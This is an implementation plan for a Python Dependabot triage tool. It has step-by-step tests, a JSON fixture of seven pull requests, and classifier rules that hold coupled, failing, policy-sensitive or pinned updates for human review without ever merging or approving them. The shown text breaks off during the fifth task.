# Dependabot Triage Automation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Classify every open Dependabot PR with a stated reason, prove the safe subset resolves and tests as a batch, consolidate PR sets that cannot merge individually, and publish a weekly report an operator acts on.

**Architecture:** A pure classifier (`dep_triage.py`) consumes a JSON snapshot produced by a thin network adapter (`dep_triage_collect.py`) and emits decisions plus a Markdown report. A GitHub Actions workflow orchestrates collect, classify, batch-proof, consolidate, and report. No step merges or approves anything.

**Tech Stack:** Python 3.11+ (stdlib only -- `argparse`, `dataclasses`, `json`, `re`, `datetime`, `pathlib`), `pytest`, GitHub Actions, `gh` CLI.

**Spec:** `docs/superpowers/specs/2026-09-19-dependabot-triage-design.md`

## Global Constraints

- **No auto-merge, no bot self-approval.** Nothing in this plan merges or approves a PR. The `main-protection` one-approval requirement is not modified. Source: `dependency-risk-audit.yml:14-17`.
- **Coverage floor is 70%** (`pyproject.toml`) and MUST NOT be lowered.
- **No AI attribution** in any commit message, comment, docstring, or document.
- **Conventional Commits** prefixes (`feat:`, `fix:`, `docs:`, `chore:`, `test:`).
- **Module placement:** `scripts/security/`, matching `scripts/security/dep_risk_audit.py`. This deviates from the spec's `scripts/dependabot/`; CLAUDE.md pattern compliance requires matching the established home for dependency tooling.
- **Module conventions**, copied from `dep_risk_audit.py`: module-level `UPPER_CASE` constants, `render_report(...) -> str`, `main(argv: list[str] | None = None) -> int`, `if __name__ == "__main__": raise SystemExit(main())`, full type hints, docstrings on public functions.
- **Tests live at** `tests/scripts/test_dep_triage.py` (matching `tests/scripts/test_commit_msg_hook.py`).
- **Cooldown defaults:** 3 days for packages, 7 days for GitHub Actions.
- **Classification codes** are the exact strings in Task 1; later tasks depend on them verbatim.
- **Never use `pull_request_target`** in the workflow.
- **Format/lint before every commit:** `black scripts/ tests/`, `flake8 scripts/ tests/`.
- **Test counts in "Expected: PASS (N tests)" are indicative, not binding.** Trust
  the actual pytest output; a differing total is not a failure by itself.

---

### Task 1: Data model, classification codes, and snapshot loader

**Files:**
- Create: `scripts/security/dep_triage.py`
- Create: `tests/scripts/test_dep_triage.py`
- Create: `tests/fixtures/dep_triage/batch_2026_09_19.json`

**Interfaces:**
- Consumes: nothing.
- Produces: `CheckRun`, `PRSnapshot`, `Decision` dataclasses; the `CODE_*` constants; `load_snapshot(path: Path) -> list[PRSnapshot]`.

- [ ] **Step 1: Write the failing test**

```python
# tests/scripts/test_dep_triage.py
"""Tests for the Dependabot triage classifier."""

import json
from pathlib import Path

import pytest

from scripts.security import dep_triage as dt

FIXTURE = Path("tests/fixtures/dep_triage/batch_2026_09_19.json")


def test_load_snapshot_reads_all_prs():
    prs = dt.load_snapshot(FIXTURE)
    assert len(prs) == 7
    assert {p.number for p in prs} == {386, 439, 442, 443, 446, 450, 452}


def test_load_snapshot_parses_checks_and_metadata():
    prs = {p.number: p for p in dt.load_snapshot(FIXTURE)}
    pr = prs[443]
    assert pr.author == "dependabot[bot]"
    assert pr.ecosystem == "npm"
    assert pr.directory == "/frontend"
    assert pr.package == "@vitest/coverage-v8"
    assert pr.from_version == "4.1.11"
    assert pr.to_version == "5.0.0"
    assert all(c.conclusion == "success" for c in pr.checks)


def test_snapshot_is_immutable():
    pr = dt.load_snapshot(FIXTURE)[0]
    with pytest.raises(Exception):
        pr.number = 1  # frozen dataclass
```

- [ ] **Step 2: Create the fixture**

This fixture is the regression corpus for the whole plan. It encodes the real observed state of the 2026-09-19 batch.

```json
{
  "generated_at": "2026-09-19T00:00:00Z",
  "pull_requests": [
    {
      "number": 386,
      "title": "chore: release 1.8.0",
      "author": "app/github-actions",
      "files": ["CHANGELOG.md", "version.txt"],
      "checks": [],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "unknown",
      "directory": "/",
      "package": "",
      "from_version": "",
      "to_version": "",
      "release_age_days": null,
      "risk_tier": "unknown"
    },
    {
      "number": 439,
      "title": "chore(deps): update pydantic requirement from >=2.12.5 to >=2.13.5",
      "author": "dependabot[bot]",
      "files": ["requirements.txt", "requirements-api.txt"],
      "checks": [
        {"name": "Python Quality & Tests", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Analyze (python)", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""}
      ],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "pip",
      "directory": "/",
      "package": "pydantic",
      "from_version": "2.12.5",
      "to_version": "2.13.5",
      "release_age_days": 30.0,
      "risk_tier": "healthy"
    },
    {
      "number": 442,
      "title": "chore(deps-dev): bump vitest from 4.1.11 to 5.0.0 in /frontend",
      "author": "dependabot[bot]",
      "files": ["frontend/package.json", "frontend/package-lock.json"],
      "checks": [
        {"name": "Python Quality & Tests", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Analyze (python)", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Security Scanning", "status": "completed", "conclusion": "failure", "failing_log_excerpt": "##[error]Process completed with exit code 35.\n##[error]Path does not exist: trivy-results.sarif"}
      ],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "npm",
      "directory": "/frontend",
      "package": "vitest",
      "from_version": "4.1.11",
      "to_version": "5.0.0",
      "release_age_days": 20.0,
      "risk_tier": "healthy"
    },
    {
      "number": 443,
      "title": "chore(deps-dev): bump @vitest/coverage-v8 from 4.1.11 to 5.0.0 in /frontend",
      "author": "dependabot[bot]",
      "files": ["frontend/package.json", "frontend/package-lock.json"],
      "checks": [
        {"name": "Python Quality & Tests", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Analyze (python)", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""}
      ],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "npm",
      "directory": "/frontend",
      "package": "@vitest/coverage-v8",
      "from_version": "4.1.11",
      "to_version": "5.0.0",
      "release_age_days": 20.0,
      "risk_tier": "healthy"
    },
    {
      "number": 446,
      "title": "chore(deps): update cfn-lint requirement from >=1.53.2 to >=1.56.0",
      "author": "dependabot[bot]",
      "files": ["requirements.txt"],
      "checks": [
        {"name": "Python Quality & Tests", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Analyze (python)", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""}
      ],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "pip",
      "directory": "/",
      "package": "cfn-lint",
      "from_version": "1.53.2",
      "to_version": "1.56.0",
      "release_age_days": 12.0,
      "risk_tier": "healthy"
    },
    {
      "number": 450,
      "title": "chore(deps): bump github/codeql-action/upload-sarif from 4.37.9 to 4.38.0",
      "author": "dependabot[bot]",
      "files": [".github/workflows/code-quality.yml"],
      "checks": [
        {"name": "Python Quality & Tests", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Analyze (python)", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""}
      ],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "github-actions",
      "directory": "/",
      "package": "github/codeql-action/upload-sarif",
      "from_version": "4.37.9",
      "to_version": "4.38.0",
      "release_age_days": 9.0,
      "risk_tier": "healthy"
    },
    {
      "number": 452,
      "title": "chore(deps): bump github/codeql-action/analyze from 4.37.9 to 4.38.0",
      "author": "dependabot[bot]",
      "files": [".github/workflows/codeql.yml"],
      "checks": [
        {"name": "Python Quality & Tests", "status": "completed", "conclusion": "success", "failing_log_excerpt": ""},
        {"name": "Analyze (python)", "status": "completed", "conclusion": "failure", "failing_log_excerpt": "Not all workflow steps that use `github/codeql-action` actions use the same version."}
      ],
      "required_checks": ["Python Quality & Tests", "Analyze (python)"],
      "ecosystem": "github-actions",
      "directory": "/",
      "package": "github/codeql-action/analyze",
      "from_version": "4.37.9",
      "to_version": "4.38.0",
      "release_age_days": 9.0,
      "risk_tier": "healthy"
    }
  ]
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.security.dep_triage'`

- [ ] **Step 4: Write minimal implementation**

```python
# scripts/security/dep_triage.py
"""Dependabot triage classifier.

Pure decision logic: consumes a JSON snapshot produced by
``dep_triage_collect.py`` and emits a classification plus a stated reason for
every open pull request. Performs no network access and has no side effects, so
the whole rule set is unit-testable against recorded fixtures.

Nothing in this module merges or approves a pull request. See
``docs/superpowers/specs/2026-09-19-dependabot-triage-design.md``.
"""

from __future__ import annotations

import json
from dataclasses import dataclass
from pathlib import Path

DEPENDABOT_AUTHOR = "dependabot[bot]"

# Classification codes. Consumers match on these exact strings.
CODE_NON_DEPENDABOT = "excluded:non-dependabot"
CODE_NO_CHECKS = "excluded:no-checks"
CODE_POLICY_REVIEW = "held:policy-review"
CODE_PINNED_BY_POLICY = "held:pinned-by-policy"
CODE_RISK_TIER = "held:risk-tier"
CODE_COUPLED = "coupled"
CODE_FAILING = "attention:failing"
CODE_SUSPECTED_FLAKE = "attention:suspected-flake"
CODE_MISSING_REQUIRED = "attention:missing-required"
CODE_CONFLICT = "attention:conflict"
CODE_MAJOR = "held:major-review"
CODE_COOLDOWN = "held:cooldown"
CODE_CANDIDATE = "candidate"
CODE_MERGE_SAFE = "merge-safe"


@dataclass(frozen=True)
class CheckRun:
    """One check run on a pull request head."""

    name: str
    status: str
    conclusion: str | None
    failing_log_excerpt: str = ""


@dataclass(frozen=True)
class PRSnapshot:
    """Recorded state of one open pull request."""

    number: int
    title: str
    author: str
    files: tuple[str, ...]
    checks: tuple[CheckRun, ...]
    required_checks: tuple[str, ...]
    ecosystem: str
    directory: str
    package: str
    from_version: str
    to_version: str
    release_age_days: float | None
    risk_tier: str


@dataclass(frozen=True)
class Decision:
    """Classification outcome for one pull request."""

    number: int
    code: str
    reason: str
    family: str | None = None


def load_snapshot(path: Path) -> list[PRSnapshot]:
    """Read a snapshot JSON file into immutable PRSnapshot records."""
    raw = json.loads(Path(path).read_text(encoding="utf-8"))
    snapshots: list[PRSnapshot] = []
    for item in raw["pull_requests"]:
        checks = tuple(
            CheckRun(
                name=c["name"],
                status=c["status"],
                conclusion=c.get("conclusion"),
                failing_log_excerpt=c.get("failing_log_excerpt", ""),
            )
            for c in item["checks"]
        )
        snapshots.append(
            PRSnapshot(
                number=item["number"],
                title=item["title"],
                author=item["author"],
                files=tuple(item["files"]),
                checks=checks,
                required_checks=tuple(item["required_checks"]),
                ecosystem=item["ecosystem"],
                directory=item["directory"],
                package=item["package"],
                from_version=item["from_version"],
                to_version=item["to_version"],
                release_age_days=item.get("release_age_days"),
                risk_tier=item.get("risk_tier", "unknown"),
            )
        )
    return snapshots
```

- [ ] **Step 5: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (3 tests)

- [ ] **Step 6: Format, lint, commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add scripts/security/dep_triage.py tests/scripts/test_dep_triage.py tests/fixtures/dep_triage/batch_2026_09_19.json
git commit -m "feat: add dependabot triage data model and snapshot loader"
```

---

### Task 2: Hard exclusion rules (R1, R2)

Catches PR #386 two independent ways: wrong author, and zero check runs making "no failures" vacuously true.

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: `PRSnapshot`, `Decision`, `CODE_NON_DEPENDABOT`, `CODE_NO_CHECKS` from Task 1.
- Produces: `rule_non_dependabot(pr) -> Decision | None`, `rule_no_checks(pr) -> Decision | None`.

- [ ] **Step 1: Write the failing test**

```python
def _pr(**kw):
    """Build a PRSnapshot with harmless defaults, overridden by kwargs."""
    base = dict(
        number=1, title="t", author=dt.DEPENDABOT_AUTHOR, files=(),
        checks=(dt.CheckRun("Python Quality & Tests", "completed", "success"),),
        required_checks=("Python Quality & Tests",), ecosystem="pip",
        directory="/", package="x", from_version="1.0.0", to_version="1.0.1",
        release_age_days=30.0, risk_tier="healthy",
    )
    base.update(kw)
    return dt.PRSnapshot(**base)


def test_release_please_pr_excluded_by_author():
    pr = _pr(number=386, author="app/github-actions")
    d = dt.rule_non_dependabot(pr)
    assert d is not None
    assert d.code == dt.CODE_NON_DEPENDABOT
    assert "dependabot" in d.reason.lower()


def test_dependabot_pr_not_excluded_by_author():
    assert dt.rule_non_dependabot(_pr()) is None


def test_zero_checks_excluded():
    pr = _pr(number=386, checks=())
    d = dt.rule_no_checks(pr)
    assert d is not None
    assert d.code == dt.CODE_NO_CHECKS


def test_pr_with_checks_not_excluded_by_no_checks():
    assert dt.rule_no_checks(_pr()) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k "excluded or author" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'rule_non_dependabot'`

- [ ] **Step 3: Write minimal implementation**

```python
def rule_non_dependabot(pr: PRSnapshot) -> Decision | None:
    """R1: only Dependabot PRs are in scope.

    Keyed on author identity rather than title text, so Release Please and
    other bot PRs are excluded regardless of how they are titled.
    """
    if pr.author != DEPENDABOT_AUTHOR:
        return Decision(
            number=pr.number,
            code=CODE_NON_DEPENDABOT,
            reason=f"author is {pr.author!r}, not {DEPENDABOT_AUTHOR!r}",
        )
    return None


def rule_no_checks(pr: PRSnapshot) -> Decision | None:
    """R2: a PR with no check runs has not been validated.

    Without this, "no failing checks" is vacuously true for any PR whose
    workflows never ran, which would read as safe.
    """
    if not pr.checks:
        return Decision(
            number=pr.number,
            code=CODE_NO_CHECKS,
            reason="no check runs present; absence of failures proves nothing",
        )
    return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (7 tests)

- [ ] **Step 5: Format, lint, commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add dependabot triage hard exclusion rules"
```

---

### Task 3: Policy-path and held-package rules (R3, R4)

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: Task 1 types; `CODE_POLICY_REVIEW`, `CODE_PINNED_BY_POLICY`, `CODE_RISK_TIER`.
- Produces: `POLICY_PATHS`, `DELIBERATE_HOLDS`, `HELD_TIERS`, `rule_policy_path(pr) -> Decision | None`, `rule_held_package(pr) -> Decision | None`.

- [ ] **Step 1: Write the failing test**

```python
def test_dockerfile_change_held_for_policy_review():
    pr = _pr(files=("deploy/docker/api/Dockerfile",), ecosystem="docker")
    d = dt.rule_policy_path(pr)
    assert d is not None
    assert d.code == dt.CODE_POLICY_REVIEW
    assert "ECR" in d.reason or "base image" in d.reason


def test_coverage_threshold_file_held_for_policy_review():
    d = dt.rule_policy_path(_pr(files=("pyproject.toml",)))
    assert d is not None
    assert d.code == dt.CODE_POLICY_REVIEW


def test_requirements_change_not_policy_held():
    assert dt.rule_policy_path(_pr(files=("requirements.txt",))) is None


def test_policy_path_does_not_match_substring_lookalikes():
    """A component named after Dockerfile is not a Dockerfile."""
    pr = _pr(files=("frontend/src/components/DockerfileViewer.jsx",))
    assert dt.rule_policy_path(pr) is None


def test_policy_path_matches_dockerfile_variants():
    pr = _pr(files=("deploy/docker/api/Dockerfile.prod",))
    assert dt.rule_policy_path(pr) is not None


def test_policy_path_matches_nested_pyproject():
    assert dt.rule_policy_path(_pr(files=("tools/pyproject.toml",))) is not None


def test_tree_sitter_is_pinned_by_policy():
    pr = _pr(package="tree-sitter", from_version="0.25.2", to_version="0.26.0")
    d = dt.rule_held_package(pr)
    assert d is not None
    assert d.code == dt.CODE_PINNED_BY_POLICY
    assert "timeout_micros" in d.reason or "DoS" in d.reason


def test_at_risk_tier_is_held():
    d = dt.rule_held_package(_pr(package="gremlinpython", risk_tier="at-risk"))
    assert d is not None
    assert d.code == dt.CODE_RISK_TIER


def test_healthy_tier_not_held():
    assert dt.rule_held_package(_pr(package="pydantic")) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k "policy or pinned or tier" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'rule_policy_path'`

- [ ] **Step 3: Write minimal implementation**

```python
# Requires `from pathlib import PurePosixPath` in the module header.
#
# Path markers whose changes require human policy review rather than a version
# judgement. Keep each entry commented with the rule it protects.
POLICY_PATHS: dict[str, str] = {
    "Dockerfile": (
        "container base images must come from private ECR "
        "(aura-base-images); a bump can silently reintroduce a public image"
    ),
    "pyproject.toml": (
        "carries the 70% coverage threshold, which must not be lowered"
    ),
}

# Packages deliberately capped for a documented reason.
DELIBERATE_HOLDS: dict[str, str] = {
    "tree-sitter": (
        "capped below 0.26: that release removed parser.timeout_micros, the "
        "parse-time DoS guard used in "
        "src/services/vulnerability_scanner/parsing/ast.py. See "
        "docs/DEFERRED_WORK_REGISTRY.md"
    ),
}

# Risk-register tiers whose entries say "pin precisely".
HELD_TIERS: frozenset[str] = frozenset({"at-risk", "replace-now"})


def rule_policy_path(pr: PRSnapshot) -> Decision | None:
    """R3: changes to policy-sensitive paths need human review.

    Matching is on a path-segment boundary, not substring containment. A file
    named DockerfileViewer.jsx is not a Dockerfile, and holding it would be a
    false positive -- the report's value rests on a human trusting its reasons.
    The dotted-suffix case is deliberate: Dockerfile.prod and friends are real
    and are policy-sensitive. PurePosixPath keeps the behaviour independent of
    the host OS.
    """
    for path in pr.files:
        name = PurePosixPath(path).name
        for marker, why in POLICY_PATHS.items():
            if name == marker or name.startswith(f"{marker}."):
                return Decision(
                    number=pr.number,
                    code=CODE_POLICY_REVIEW,
                    reason=f"touches {path}: {why}",
                )
    return None


def rule_held_package(pr: PRSnapshot) -> Decision | None:
    """R4: deliberate holds and At-Risk register entries are not bumped."""
    if pr.package in DELIBERATE_HOLDS:
        return Decision(
            number=pr.number,
            code=CODE_PINNED_BY_POLICY,
            reason=DELIBERATE_HOLDS[pr.package],
        )
    if pr.risk_tier.lower() in HELD_TIERS:
        return Decision(
            number=pr.number,
            code=CODE_RISK_TIER,
            reason=(
                f"{pr.package} is tier {pr.risk_tier!r} in the dependency risk "
                "register, which specifies pinning precisely"
            ),
        )
    return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (13 tests)

- [ ] **Step 5: Format, lint, commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add dependabot triage policy-path and held-package rules"
```

---

### Task 4: Coupled-family detection (R5)

The highest-value rule. Both #450 and #443 were fully green; coupling must be decided before check results are read.

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: Task 1 types; `CODE_COUPLED`.
- Produces: `family_key(pr) -> str | None` (a *candidate* key), `detect_families(prs) -> dict[int, str]` (confirms candidates), `_has_unscoped_root(key, members) -> bool`, `rule_coupled(pr, families) -> Decision | None`.

- [ ] **Step 1: Write the failing test**

```python
def test_family_key_groups_codeql_action_subactions():
    a = _pr(number=450, ecosystem="github-actions",
            package="github/codeql-action/upload-sarif")
    b = _pr(number=452, ecosystem="github-actions",
            package="github/codeql-action/analyze")
    assert dt.family_key(a) == dt.family_key(b) == "github/codeql-action"


def test_family_key_groups_vitest_peer_cluster_per_directory():
    a = _pr(number=442, ecosystem="npm", directory="/frontend", package="vitest")
    b = _pr(number=443, ecosystem="npm", directory="/frontend",
            package="@vitest/coverage-v8")
    assert dt.family_key(a) == dt.family_key(b) == "npm:/frontend:vitest"


def test_family_key_separates_same_package_in_different_directories():
    a = _pr(ecosystem="npm", directory="/frontend", package="vitest")
    b = _pr(ecosystem="npm", directory="/sdk/typescript", package="vitest")
    assert dt.family_key(a) != dt.family_key(b)


def test_detect_families_ignores_singletons():
    prs = [
        _pr(number=439, ecosystem="pip", package="pydantic"),
        _pr(number=450, ecosystem="github-actions",
            package="github/codeql-action/upload-sarif"),
        _pr(number=452, ecosystem="github-actions",
            package="github/codeql-action/analyze"),
    ]
    families = dt.detect_families(prs)
    assert 439 not in families
    assert families[450] == families[452] == "github/codeql-action"


def test_green_pr_in_coupled_family_is_still_coupled():
    """#450 was fully green and still unsafe to merge alone."""
    prs = dt.load_snapshot(FIXTURE)
    families = dt.detect_families(prs)
    pr450 = next(p for p in prs if p.number == 450)
    assert all(c.conclusion == "success" for c in pr450.checks)
    d = dt.rule_coupled(pr450, families)
    assert d is not None
    assert d.code == dt.CODE_COUPLED
    assert d.family == "github/codeql-action"


def test_uncoupled_pr_returns_none():
    prs = dt.load_snapshot(FIXTURE)
    families = dt.detect_families(prs)
    pr439 = next(p for p in prs if p.number == 439)
    assert dt.rule_coupled(pr439, families) is None


def test_shared_npm_scope_alone_is_not_a_family():
    """@types/react and @types/node release independently."""
    prs = [
        _pr(number=1, ecosystem="npm", directory="/frontend", package="@types/react"),
        _pr(number=2, ecosystem="npm", directory="/frontend", package="@types/node"),
    ]
    assert dt.detect_families(prs) == {}


def test_shared_babel_scope_alone_is_not_a_family():
    prs = [
        _pr(number=1, ecosystem="npm", directory="/frontend", package="@babel/core"),
        _pr(number=2, ecosystem="npm", directory="/frontend",
            package="@babel/preset-env"),
    ]
    assert dt.detect_families(prs) == {}


def test_scoped_package_couples_with_its_unscoped_namesake():
    prs = [
        _pr(number=442, ecosystem="npm", directory="/frontend", package="vitest"),
        _pr(number=443, ecosystem="npm", directory="/frontend",
            package="@vitest/coverage-v8"),
    ]
    families = dt.detect_families(prs)
    assert families[442] == families[443] == "npm:/frontend:vitest"


def test_single_segment_action_is_not_grouped():
    """actions/checkout has no sub-action segment, so it has no family."""
    pr = _pr(ecosystem="github-actions", package="actions/checkout")
    assert dt.family_key(pr) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k "family or coupled" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'family_key'`

- [ ] **Step 3: Write minimal implementation**

```python
def family_key(pr: PRSnapshot) -> str | None:
    """Return the update-family key for a PR, or None if it cannot be grouped.

    Two signals produce a family:

    * A GitHub Action whose package path has a sub-action segment
      (``github/codeql-action/init``) groups under its owner/repo. Those
      sub-actions must move in lockstep or CodeQL refuses to run.
    * An npm package groups with its scoped peers in the same directory, so
      ``vitest`` and ``@vitest/coverage-v8`` land together rather than leaving
      a peer-version conflict.
    """
    if pr.ecosystem == "github-actions" and pr.package.count("/") >= 2:
        owner, repo, *_ = pr.package.split("/")
        return f"{owner}/{repo}"
    if pr.ecosystem == "npm" and pr.package:
        root = pr.package.lstrip("@").split("/")[0]
        return f"npm:{pr.directory}:{root}"
    return None


def detect_families(prs: list[PRSnapshot]) -> dict[int, str]:
    """Map PR number to family key, for families with more than one member.

    An npm candidate family is kept only when it contains the unscoped package
    its scope is named for. A shared scope alone is not coupling.
    """
    grouped: dict[str, list[PRSnapshot]] = {}
    for pr in prs:
        key = family_key(pr)
        if key is not None:
            grouped.setdefault(key, []).append(pr)

    families: dict[int, str] = {}
    for key, members in grouped.items():
        if len(members) < 2:
            continue
        if key.startswith("npm:") and not _has_unscoped_root(key, members):
            continue
        for pr in members:
            families[pr.number] = key
    return families


def _has_unscoped_root(key: str, members: list[PRSnapshot]) -> bool:
    """True when one member is the unscoped package the scope is named for.

    A shared npm scope is not evidence of coupling: @types/react and
    @types/node release on independent cadences, as do @babel/core and
    @babel/preset-env. The coupling that matters is a scoped package pinned to
    its unscoped namesake, as @vitest/coverage-v8 is to vitest, so a family
    requires that namesake to be under update as well.

    Known limitation, accepted deliberately: a scoped cluster with no unscoped
    root in the batch (@vitest/coverage-v8 alongside @vitest/ui, with no vitest
    PR) is not detected. It loses nothing, because either member alone is a
    singleton that no grouping rule would have caught either.
    """
    root = key.rsplit(":", 1)[-1]
    return any(member.package == root for member in members)


def rule_coupled(pr: PRSnapshot, families: dict[int, str]) -> Decision | None:
    """R5: no member of a multi-PR family is individually mergeable.

    Evaluated before check results, because the dangerous case is a *green*
    sibling: a PR can pass every check and still leave the repository
    inconsistent once merged alone.
    """
    key = families.get(pr.number)
    if key is None:
        return None
    return Decision(
        number=pr.number,
        code=CODE_COUPLED,
        reason=(
            f"member of update family {key!r}; members must land together, so "
            "this PR is not individually mergeable regardless of its checks"
        ),
        family=key,
    )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (19 tests)

- [ ] **Step 5: Format, lint, commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add dependabot triage coupled-family detection"
```

---

### Task 5: Check-evaluation rules (R6, R7)

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: Task 1 types; `CODE_FAILING`, `CODE_SUSPECTED_FLAKE`, `CODE_MISSING_REQUIRED`.
- Produces: `FLAKE_SIGNATURES`, `rule_failing(pr) -> Decision | None`, `rule_missing_required(pr) -> Decision | None`.

- [ ] **Step 1: Write the failing test**

```python
def test_trivy_download_failure_is_suspected_flake():
    """#442 failed because the trivy installer died, not because of a defect."""
    prs = {p.number: p for p in dt.load_snapshot(FIXTURE)}
    d = dt.rule_failing(prs[442])
    assert d is not None
    assert d.code == dt.CODE_SUSPECTED_FLAKE
    assert "Security Scanning" in d.reason


def test_codeql_version_mismatch_is_real_failure():
    prs = {p.number: p for p in dt.load_snapshot(FIXTURE)}
    d = dt.rule_failing(prs[452])
    assert d is not None
    assert d.code == dt.CODE_FAILING


def test_all_green_pr_has_no_failure_decision():
    prs = {p.number: p for p in dt.load_snapshot(FIXTURE)}
    assert dt.rule_failing(prs[439]) is None


def test_timed_out_counts_as_failure():
    pr = _pr(checks=(dt.CheckRun("Python Quality & Tests", "completed", "timed_out"),))
    d = dt.rule_failing(pr)
    assert d is not None
    assert d.code == dt.CODE_FAILING


def test_missing_required_check_is_not_treated_as_pass():
    """An unrun required check is missing, not passing."""
    pr = _pr(
        checks=(dt.CheckRun("Analyze (python)", "completed", "success"),),
        required_checks=("Analyze (python)", "Python Quality & Tests"),
    )
    d = dt.rule_missing_required(pr)
    assert d is not None
    assert d.code == dt.CODE_MISSING_REQUIRED
    assert "Python Quality & Tests" in d.reason


def test_all_required_checks_present_returns_none():
    assert dt.rule_missing_required(_pr()) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k "flake or failure or required or timed" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'rule_failing'`

- [ ] **Step 3: Write minimal implementation**

```python
# Substrings in a failing step's log that indicate infrastructure trouble
# rather than a defect in the change under test.
# Each entry must be specific enough that a genuinely broken change cannot
# produce it. A generic filesystem or path error does not belong here: a bad
# path introduced by the change itself would then be waved through as
# infrastructure noise.
FLAKE_SIGNATURES: tuple[str, ...] = (
    "exit code 35",
    "Could not resolve host",
    "connection reset",
    "TLS handshake timeout",
    "rate limit",
    "429 Too Many Requests",
    "ECONNRESET",
)

FAILED_CONCLUSIONS: frozenset[str] = frozenset({"failure", "timed_out"})


def _is_flake(check: CheckRun) -> bool:
    """True when a failed check's log carries an infrastructure signature."""
    excerpt = check.failing_log_excerpt.lower()
    return any(signature.lower() in excerpt for signature in FLAKE_SIGNATURES)


def rule_failing(pr: PRSnapshot) -> Decision | None:
    """R6: classify failing checks, separating infrastructure flakes.

    A flake is worth a rerun; a real failure is worth a human. Conflating them
    means genuine failures get retried and flakes rot untouched.

    Each failed check is judged on its own log. A PR is only called a flake
    when every failed check is one: if a genuine failure and a flake land
    together, the genuine failure decides, because a "rerun once" label on a
    real defect hides it until someone reruns and watches it fail again.
    """
    failed = [c for c in pr.checks if (c.conclusion or "") in FAILED_CONCLUSIONS]
    if not failed:
        return None

    flaky: list[CheckRun] = []
    genuine: list[CheckRun] = []
    for check in failed:
        (flaky if _is_flake(check) else genuine).append(check)

    if genuine:
        reason = f"{', '.join(c.name for c in genuine)} failed"
        if flaky:
            reason += (
                f" (also failing with an infrastructure signature: "
                f"{', '.join(c.name for c in flaky)})"
            )
        return Decision(number=pr.number, code=CODE_FAILING, reason=reason)

    return Decision(
        number=pr.number,
        code=CODE_SUSPECTED_FLAKE,
        reason=(
            f"{', '.join(c.name for c in flaky)} failed with an "
            "infrastructure signature, not a defect in the change; rerun once "
            "before escalating"
        ),
    )


def rule_missing_required(pr: PRSnapshot) -> Decision | None:
    """R7: a required check that never ran is missing, never passing.

    A required check absent from the run set looks identical to "nothing
    failed" when only conclusions are inspected. Treating absence as success is
    how a PR that never triggered its own test workflow gets reported as safe.
    """
    present = {c.name for c in pr.checks}
    missing = [name for name in pr.required_checks if name not in present]
    if not missing:
        return None
    return Decision(
        number=pr.number,
        code=CODE_MISSING_REQUIRED,
        reason=(
            "required check(s) absent from the run set: "
            f"{', '.join(missing)}; an unrun check is not a passing check"
        ),
    )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (25 tests)

- [ ] **Step 5: Format, lint, commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
